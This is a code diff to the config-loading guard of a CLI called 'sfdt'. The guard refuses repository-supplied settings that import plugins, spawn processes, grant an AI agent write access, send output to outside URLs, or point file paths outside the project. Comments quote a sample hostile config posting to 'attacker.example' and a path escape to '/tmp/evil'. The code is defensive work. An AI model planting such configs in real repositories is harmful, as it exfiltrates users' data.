@@ -4,19 +4,30 @@
  * `sfdt init` tells users to gitignore only `.sfdt/*.local.json`, so
  * `config.json` is *meant* to be committed and shared — which means it arrives
  * with whatever repository the user cloned. It is therefore attacker-controlled
- * input, not user input, and a handful of its keys are code-execution or
- * data-exfiltration primitives:
+ * input, not user input.
  *
- *   - `plugins[]`                       → dynamically import()ed at CLI startup
- *   - `mcp.salesforce.command` / `args` → spawned as a process
- *   - `ai.baseURL`                      → the destination env-var-named secrets are sent to
- *   - a notification channel's `headersEnv` next to a literal URL → same, for webhooks
+ * **It classifies by capability, not by key name.** The first version of this
+ * module enumerated five keys, so every new path-shaped, URL-shaped or
+ * privilege-shaped key shipped unguarded until someone remembered to add it
+ * (sfdt-private#14). The rules below are grouped by what a value *does*, and
+ * each group is driven by a set a new key joins in one line:
+ *
+ *   - **Code execution** — `plugins[]`, `pluginOptions.autoDiscover`:
+ *     dynamically import()ed at CLI startup.
+ *   - **Process spawn** — `mcp.salesforce.command` / `args`.
+ *   - **Privilege** — `ai.agent.*`: grants the AI model write access to the
+ *     checkout. No longer honoured from a config file at all (see below).
+ *   - **Destination** — `ai.baseURL`, a notification channel's literal
+ *     `webhookUrl` / `url`: chooses where prompts and secrets are sent.
+ *   - **Path** — `PROJECT_PATH_CONFIG_KEYS` in `safe-path.js`: every key whose
+ *     value becomes a filesystem path, contained to the project root.
  *
  * The dashboard already encodes exactly this model: `gui-server/index.js`
  * blocklists these keys from its PATCH endpoint. That check sat one layer too
  * high — it stopped the *API* writing them while the config file itself was
  * trusted implicitly. This module moves the decision to where the file actually
- * crosses the trust boundary: load time.
+ * crosses the trust boundary: load time. The GUI's own path-containment copy is
+ * gone; both surfaces now call `isPathWithinRoot` from `safe-path.js`.
  *
  * **The opt-in cannot live in the config file.** An `allowPlugins: true` key
  * would be set by the same attacker who set `plugins[]`. Trust has to arrive
@@ -30,8 +41,43 @@
  * fall back to for non-interactive runs anyway.
  */
 
+import { PROJECT_PATH_CONFIG_KEYS, isPathWithinRoot } from './safe-path.js';
+
 /** Environment variable that opts a shell in to repo-supplied unsafe settings. */
 export const TRUST_ENV_VAR = 'SFDT_ALLOW_UNSAFE_CONFIG';
+
+/**
+ * Environment variable that grants the write-capable agent loop, separately
+ * from the blanket config opt-in above.
+ *
+ * Kept distinct from `TRUST_ENV_VAR` on purpose: trusting a repo's plugin list
+ * is a much smaller decision than handing a model `Edit` in your checkout, and
+ * one should not imply the other. `agent-loop.js` reads this; nothing in
+ * `.sfdt/config.json` can substitute for it.
+ */
+export const AI_WRITE_ENV_VAR = 'SFDT_ALLOW_AI_WRITE';
+
+/**
+ * The privilege keys: booleans that used to grant the write-capable agent loop
+ * straight from the committed file.
+ *
+ * `runFixLoop` hands the model `Edit` + `Bash` with `cwd: projectRoot` and its
+ * own header calls it "the highest-risk feature in the suite" — yet both of its
+ * gates were read from the file that arrives with the clone. The authority now
+ * lives in `AI_WRITE_ENV_VAR`; these are refused here as well so that nothing
+ * downstream (the dashboard's settings view, a future consumer) can read a
+ * cloned repo's `true` as the operator's intent.
+ */
+const PRIVILEGE_KEYS = Object.freeze([
+  {
+    path: 'ai.agent.enabled',
+    why: 'turns on the write-capable auto-fix loop, which grants the AI model Edit access to this checkout',
+  },
+  {
+    path: 'ai.agent.allowWrite',
+    why: 'grants the AI model write access to this checkout; only ' + AI_WRITE_ENV_VAR + '=1 can do that now',
+  },
+]);
 
 /**
  * A loopback destination cannot exfiltrate to an attacker, so it stays allowed.
@@ -68,12 +114,46 @@ export function isLoopbackUrl(value) {
   return LOOPBACK_HOSTS.has(url.hostname.toLowerCase());
 }
 
-/** The literal, non-env destination a notification channel would post to. */
-function literalChannelUrl(ch) {
-  if (!ch || typeof ch !== 'object') return '';
-  if (typeof ch.webhookUrl === 'string' && ch.webhookUrl) return ch.webhookUrl;
-  if (typeof ch.url === 'string' && ch.url) return ch.url;
-  return '';
+/**
+ * The channel keys that name a destination *literally*, in the precedence order
+ * `notifier.js` `channelUrl()` uses.
+ *
+ * The `*Env` siblings (`webhookUrlEnv`, `urlEnv`) are deliberately absent: that
+ * destination comes from the operator's shell, not the repository, and keeping
+ * them working is the contract `notifier.js`'s own header documents.
+ *
+ * This list and `channelUrl()` are one mechanism in two files — if a new
+ * literal key is added there and not here, the guard silently stops covering
+ * the channel's real destination.
+ */
+const LITERAL_CHANNEL_URL_KEYS = Object.freeze(['webhookUrl', 'url']);
+
+/** Read a dotted path out of a plain object; undefined if any segment is missing. */
+function getAtPath(obj, dotted) {
+  let cur = obj;
+  for (const seg of dotted.split('.')) {
+    if (!cur || typeof cur !== 'object') return undefined;
+    cur = cur[seg];
+  }
+  return cur;
+}
+
+/**
+ * Delete a dotted path, copying every object along the way.
+ *
+ * Copy-on-write rather than in-place: `sanitizeUntrustedConfig` promises not to
+ * mutate its input, and the input is the object the caller may still hold.
+ */
+function deleteAtPath(root, dotted) {
+  const segs = dotted.split('.');
+  const last = segs.pop();
+  let cur = root;
+  for (const seg of segs) {
+    if (!cur[seg] || typeof cur[seg] !== 'object') return;
+    cur[seg] = { ...cur[seg] };
+    cur = cur[seg];
+  }
+  delete cur[last];
 }
 
 /**
@@ -82,12 +162,19 @@ function literalChannelUrl(ch) {
  * Pure and side-effect free — `sanitizeUntrustedConfig` applies the result, and
  * `sfdt doctor` can report it without changing anything.
  *
+ * Every finding's `path` is a **contract**: `sanitizeUntrustedConfig` removes
+ * exactly that dotted path (channel entries carry a `[i]` index segment, which
+ * it splits back out). The two functions have to move together.
+ *
  * @param {object} config Merged config object.
+ * @param {{projectRoot?: string}} [options] Containment root for path keys;
+ *   defaults to the `_projectRoot` `loadConfig` stamps onto the merged config.
  * @returns {Array<{path: string, why: string, detail: string}>} Findings, empty if clean.
  */
-export function findUnsafeConfigSettings(config) {
+export function findUnsafeConfigSettings(config, options = {}) {
   const found = [];
   if (!config || typeof config !== 'object') return found;
+  const projectRoot = options.projectRoot ?? config._projectRoot ?? process.cwd();
 
   // ── Code execution ──────────────────────────────────────────────────────
   if (Array.isArray(config.plugins) && config.plugins.some((p) => typeof p === 'string' && p.trim())) {
@@ -125,6 +212,13 @@ export function findUnsafeConfigSettings(config) {
     });
   }
 
+  // ── Privilege ───────────────────────────────────────────────────────────
+  for (const key of PRIVILEGE_KEYS) {
+    if (getAtPath(config, key.path) === true) {
+      found.push({ path: key.path, why: key.why, detail: 'true' });
+    }
+  }
+
   // ── Exfiltration destination ────────────────────────────────────────────
   const baseURL = config.ai?.baseURL;
   if (typeof baseURL === 'string' && baseURL.trim() && !isLoopbackUrl(baseURL)) {
@@ -135,23 +229,45 @@ export function findUnsafeConfigSettings(config) {
     });
   }
 
-  // A channel that names environment variables to read AND hardcodes a
-  // non-loopback destination is the webhook form of the same primitive. A
-  // channel using `webhookUrlEnv` is not flagged — that destination comes from
-  // the environment, not the repository.
+  // A notification channel is the webhook form of the same primitive, so it
+  // gets the same rule: *any* literal non-loopback destination is refused,
+  // whether or not the channel also names env vars to read.
+  //
+  // The earlier rule only fired when `headersEnv` was present beside the URL,
+  // which missed the plainest attack there is — a cloned repo shipping
+  // `{type:"slack", webhookUrl:"https://attacker.example/collect"}` and letting
+  // the victim's own `--notify` run POST org aliases and failure text to it.
+  // No secret env var needed; the message body is the payload.
   const channels = Array.isArray(config.notifications?.channels) ? config.notifications.channels : [];
   const legacySlack = config.notifications?.slack;
   for (const [i, ch] of [...channels.entries(), ...(legacySlack ? [['slack', legacySlack]] : [])]) {
-    const hasEnvHeaders = ch?.headersEnv && typeof ch.headersEnv === 'object' && Object.keys(ch.headersEnv).length > 0;
-    const url = literalChannelUrl(ch);
-    if (hasEnvHeaders && url && !isLoopbackUrl(url)) {
-      const label = typeof i === 'number' ? `notifications.channels[${i}]` : 'notifications.slack';
+    if (!ch || typeof ch !== 'object') continue;
+    const label = typeof i === 'number' ? `notifications.channels[${i}]` : 'notifications.slack';
+    for (const key of LITERAL_CHANNEL_URL_KEYS) {
+      const url = ch[key];
+      if (typeof url !== 'string' || !url.trim() || isLoopbackUrl(url)) continue;
       found.push({
-        path: `${label}.headersEnv`,
-        why: 'reads the named environment variables and sends them to a URL fixed by this config',
-        detail: `${Object.values(ch.headersEnv).join(', ')} → ${url}`,
+        path: `${label}.${key}`,
+        why: 'posts run output — org alias, deploy and test failure text, audit summaries — to a destination fixed by this config',
+        detail: url.trim(),
       });
     }
+  }
+
+  // ── Filesystem path ─────────────────────────────────────────────────────
+  // The whole class at once, from one shared set. Every one of these values is
+  // handed to path.join/path.resolve and then written to or globbed; an
+  // absolute or `../`-escaping value redirects those writes and reads outside
+  // the project. Verified for `manifestDir`, which reached /tmp/evil/pkg.xml.
+  for (const key of PROJECT_PATH_CONFIG_KEYS) {
+    const value = getAtPath(config, key);
+    if (typeof value !== 'string' || !value.trim()) continue;
+    if (isPathWithinRoot(projectRoot, value.trim())) continue;
+    found.push({
+      path: key,
+      why: 'is resolved to a filesystem path this CLI reads and writes, and this value escapes the project root',
+      detail: value.trim(),
+    });
   }
 
   return found;
@@ -166,45 +282,41 @@ export function findUnsafeConfigSettings(config) {
  * which is the thing actually removed here.
  *
  * @param {object} config Merged config object.
- * @param {{allow?: boolean}} [options] `allow` defaults to the TRUST_ENV_VAR opt-in.
+ * @param {{allow?: boolean, projectRoot?: string}} [options] `allow` defaults to
+ *   the TRUST_ENV_VAR opt-in; `projectRoot` is passed through for path keys.
  * @returns {{config: object, refused: Array<{path: string, why: string, detail: string}>}}
  */
 export function sanitizeUntrustedConfig(config, options = {}) {
   const allow = options.allow ?? process.env[TRUST_ENV_VAR] === '1';
-  const found = findUnsafeConfigSettings(config);
+  const found = findUnsafeConfigSettings(config, options);
   if (allow || found.length === 0) return { config, refused: [] };
 
   const next = { ...config };
   for (const finding of found) {
-    if (finding.path === 'plugins') {
-      delete next.plugins;
-    } else if (finding.path === 'pluginOptions.autoDiscover') {
-      next.pluginOptions = { ...next.pluginOptions };
-      delete next.pluginOptions.autoDiscover;
-    } else if (finding.path === 'mcp.salesforce.command') {
+    // Channel findings are the one shape that is not a plain dotted path — the
+    // `[i]` segment indexes an array, so they are split out and applied to the
+    // one channel. `findUnsafeConfigSettings` builds these labels; the two ends
+    // of that contract have to be edited together.
+    const channelMatch = /^notifications\.channels\[(\d+)\]\.(.+)$/.exec(finding.path);
+    if (channelMatch) {
+      const [, idx, key] = channelMatch;
+      next.notifications = { ...next.notifications };
+      next.notifications.channels = next.notifications.channels.map((ch, i) => {
+        if (i !== Number(idx)) return ch;
+        const copy = { ...ch };
+        delete copy[key];
+        return copy;
+      });
+      continue;
+    }
+    if (finding.path === 'mcp.salesforce.command') {
       // Drop `args` with the command: on its own it is inert, and leaving it
       // behind would apply attacker-chosen arguments to the default `sf` binary.
-      next.mcp = { ...next.mcp, salesforce: { ...next.mcp.salesforce } };
-      delete next.mcp.salesforce.command;
-      delete next.mcp.salesforce.args;
-    } else if (finding.path === 'ai.baseURL') {
-      next.ai = { ...next.ai };
-      delete next.ai.baseURL;
-    } else if (finding.path.endsWith('.headersEnv')) {
-      next.notifications = { ...next.notifications };
-      if (finding.path === 'notifications.slack.headersEnv') {
-        next.notifications.slack = { ...next.notifications.slack };
-        delete next.notifications.slack.headersEnv;
-      } else {
-        const idx = Number(finding.path.match(/\[(\d+)\]/)?.[1]);
-        next.notifications.channels = next.notifications.channels.map((ch, i) => {
-          if (i !== idx) return ch;
-          const copy = { ...ch };
-          delete copy.headersEnv;
-          return copy;
-        });
-      }
+      deleteAtPath(next, 'mcp.salesforce.command');
+      deleteAtPath(next, 'mcp.salesforce.args');
+      continue;
     }
+    deleteAtPath(next, finding.path);
   }
 
   return { config: next, refused: found };
